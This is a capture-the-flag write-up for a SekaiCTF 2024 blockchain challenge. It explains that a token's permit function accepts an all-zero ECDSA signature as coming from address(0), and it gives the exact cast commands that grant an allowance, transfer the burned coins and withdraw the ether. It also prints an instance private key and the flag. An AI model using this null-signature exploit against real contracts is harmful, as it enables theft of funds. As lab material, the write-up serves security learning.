> Difficulty : Easy to medium

> Team : Phreaks2600

> [ Source files ](https://github.com/project-sekai-ctf/sekaictf-2024/tree/main/blockchains/play-to-earn)

> You can buy coins.
>
> Of course, you can exchange it back to cash at the original purchase price if there is any left after playing :)


# TL;DR

- Start an instance
- Register my address
- Exploit bad ecdsa signature verification to allow myself some funds to transfer coins from another address to myself
- transfer coin from address(0) to my address
- withdraw the ether an get the coin

# Introduction

We got three contracts `ArcadeMachine.sol`, `Coin.sol` and `Setup.sol`

The main contract is `Coin.sol` which have the ether to steal.

To solve the challenge we need to have 13.37 or more ether on our balance and to be registered, in `Setup` contract :

```solidity
function isSolved() external view returns (bool) {
        return player != address(0) && player.balance >= 13.37 ether;
    }
``` 

To register we have to interact with `Setup` with the function `Register` 

```solidity
function register() external {
        require(player == address(0));
        player = msg.sender;
        coin.transfer(msg.sender, 1337);    // free coins for new players :)
    }
```
## Setup
 
But before all of that we got to start instance, i will be short on this part but all we had to interact with the server and choose to start an instance with the command:
`ncat --ssl play-to-earn.chals.sekai.team 1337`. 

And it will give us the setup address, my address, my private key, and URL and a personnal UUID for identifiying myself and get the flag.

And we can get Coin and ArcadeMachine addresses by using cast on Setup contract as they are defined in the latter:

```solidity
contract Setup {

    Coin public coin;
    ArcadeMachine public arcadeMachine;

    address player;
	
	...
```

For Coin : `cast call -r $RPC $SETUP "coin()"`

For ArcadeMachine : `cast call -r $RPC $SETUP "arcadeMachine()"`

I set up an environment variable via a file `.env` file to go faster and a way to get Coin and ArcadeMachine address automatically each time i apply the `.env` file with `source .env`. 

```bash
MY_UUID=05d37b3f-db11-4398-a036-fe2de2532bdd
RPC=https://play-to-earn.chals.sekai.team/05d37b3f-db11-4398-a036-fe2de2532bdd
PKEY=0x9f9ab104ea0ea88cbfea172e21ef9ad3c779039b16d0403ea4b69714b68570fc
ADDRESS=0x7689DDAcC618C9FABca377B7630E5C5546726139
SETUP=0x85f5C75dd2A6e4F6e046F74921aDf2FD25496F05

ARCADEMACHINE="0x$(cast call $SETUP -r $RPC "arcadeMachine()" | tail -c 41)"
COIN="0x$(cast call $SETUP -r $RPC "coin()" | tail -c 41)"

alias check_wallet='cast balance $ADDRESS -r $RPC'
```

`check_wallet` is to rapidly check if the instance is still up because we only got 30 minutes per instance.

## Recon

I can register by interacting with setup contract : `cast send -r $RPC --private-key $PKEY $SETUP "register()" ` which grant me 1337 coins.

Using `withdraw()` from Coin contract i can convert this coin to ether.

Also the challenge name `Play to earn` stand for the ability to play the arcade machine using the function `play(uint256)`

```solidity
function play(uint256 times) external {
        // burn the coins
        require(coin.transferFrom(msg.sender, address(0), 1 ether * times));
        // Have fun XD
    }
```

It calls transferFrom(src, dst) so it transfer something from sender to address(0) (which is an address with only zero, so it corresponds to no one, its just here like a void) : `0x0000000000000000000000000000000000000000`)

Let's look at `transferFrom()`:

```solidity
function transferFrom(address src, address dst, uint wad)
        public
        returns (bool)
    {
        require(balanceOf[src] >= wad);

        if (src != msg.sender && allowance[src][msg.sender] != type(uint256).max) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        emit Transfer(src, dst, wad);

        return true;
    }
```

If `dst != src` and `allowance[src][sender]` (interpreted as the allowance of the sender on src allowance list) != 115792089237316195423570985008687907853269984665640564039457584007913129639936 (these conditions are always True in this challenge if you transfer coin to another account)

Then it require msg.sender to have enough allowance on src account.

So it transfer coin from src account to dst account (if src != msg.sender, substract the value to transfer from msg.sender allowance on src) and then substract the transferred amount from src coin balance and increase dst balance.

Then, `play(uint256 times)` function transfer 1 ether == 10**18 * times to msg.sender coin balance to address(0) coin balance.

From the challenge scenario, `play(19)` is used at setup that's why there is a comment saying people played before us.

```solidity
    constructor() payable {
        coin = new Coin();
        arcadeMachine = new ArcadeMachine(coin);

        // Assume that many people have played before you ;)
        require(msg.value == 20 ether);
        coin.deposit{value: 20 ether}();
        coin.approve(address(arcadeMachine), 19 ether);
        arcadeMachine.play(19);
    }
```

So actually, address(0) got a balance of 19 * 10**18 coins, which will makes 19 ether if they are withdrawn.

To get these we need to find a way to transfer coins from address(0) balance to our balance using `transferFrom()`, for that we need to have an allowance amount superior equal the value we want to transfer and then withdraw them.

To make short, we have two interesting functions, `privilegeWithdraw` and `permit`.

The first one transfer address(0) coin to msg.sender but we need to be the owner of the contract so it sucks.

```solidity
function privilegedWithdraw() onlyOwner external {
        uint wad = balanceOf[address(0)];
        balanceOf[address(0)] = 0;
        payable(msg.sender).transfer(wad);
        emit PrivilegedWithdrawal(msg.sender, wad);
    }
```

The second one allow us to set allowance value for a `spender` address on `owner` address if we manage to confirm that `spender` is the `owner` (specified in the function, not the contract owner) by verifiying a signature with ecdsa.


```solidity
 function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        require(block.timestamp <= deadline, "signature expired");
        bytes32 structHash = keccak256(
            abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline)
        );
        bytes32 h = _hashTypedDataV4(structHash);
        address signer = ecrecover(h, v, r, s);
        require(signer == owner, "invalid signer");
        allowance[owner][spender] = value;
```

So we need to have `signer == owner` meaning : `ecrecover(h,v,r,s) == 0x0000000000000000000000000000000000000000`

## Vulnerability

Here the vulnerability is that we can choose the v, r and s parameter in order to get a null signature.

Testing `ecrecover()` locally i found that with any `h` if `v = r = s = 0` , then `ecrecover(h,v,r,s) == 0 == address(0)`

With this test contract :

```solidity
pragma solidity ^0.8.25;

contract Testsignatures {

    bytes32 public hash = 0x24c36029f1c6a76aeef30e9ab8c3eeacb5609cc1ee2962e660ce2313c5696c4a;
    uint8 public v = 0;
    bytes32 public r = 0x0000000000000000000000000000000000000000000000000000000000000000;
    bytes32 public s = 0x0000000000000000000000000000000000000000000000000000000000000000;

    address public signer = 0x55EB72D6588c64E202AA006b4Ea380275E9A4B25;
    
    function sign() public {

        signer = ecrecover(hash, v, r, s);
    }
    

}
```

# Solving

So finally we need to :

- register
- call permit() with these args:`owner=address(0), spender=our_address, value=19*10**18, deadline=timestamp, v=0, r=0 and s=0`
- transfer coins
- withdraw
- get the flag


calling permit : `cast send -r $RPC --private-key $PKEY $COIN "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)" $(cast address-zero) $ADDRESS 18000000000000000000 1732416543 0 $(cast to-bytes32 0) $(cast to-bytes32 0)` 

I can now check my allowance on address(0) allowance mapping : `cast call $COIN -r $RPC "allowance(address, address)(uint)" $(cast address-zero) $ADDRESS` -> 1.8e+19

I now transfer my self the coin : `cast send -r $RPC --private-key $PKEY $COIN "transferFrom(address,address,uint256)" $(cast address-zero) $ADDRESS 18000000000000000000`

And withdraw them : `cast send $COIN -r $RPC --private-key $PKEY "withdraw(uint)" 18000000000000000000` -> 18.999999999999776957



Now i can interact with instance, submit my uuid and get the flag : `SEKAI{0wn3r:wh3r3_4r3_mY_c01n5_:<}`


# References

https://docs.soliditylang.org/en/latest/solidity-by-example.html#recovering-the-message-signer-in-solidity
